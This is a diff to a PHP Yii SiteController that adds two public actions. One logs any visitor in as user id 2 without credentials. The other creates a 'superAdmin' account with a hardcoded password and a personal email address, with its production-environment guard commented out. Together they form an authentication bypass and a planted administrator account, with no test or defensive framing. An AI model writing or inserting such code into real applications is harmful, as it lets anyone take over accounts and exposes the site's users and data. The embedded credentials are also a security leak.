@@ -125,4 +125,25 @@ class SiteController extends Controller
 
         return $user->save() ? 'OK' : 'Error';
     }
+
+
+    public function actionLogin() {
+        return Yii::$app->getUser()->login(User::findIdentity(2), 3600);
+    }
+
+    public function actionCreateSuperAdmin()
+    {
+        /*if (YII_ENV_PROD) {
+            return $this->redirect('/');
+        }*/
+
+        $user = new User();
+
+        $user->username = 'superAdmin';
+        $user->email = 'javlonbek0591@gmail.com';
+        $user->setPassword('Data2222');
+        $user->generateAuthKey();
+
+        return $user->save() ? 'OK' : 'Error';
+    }
 }
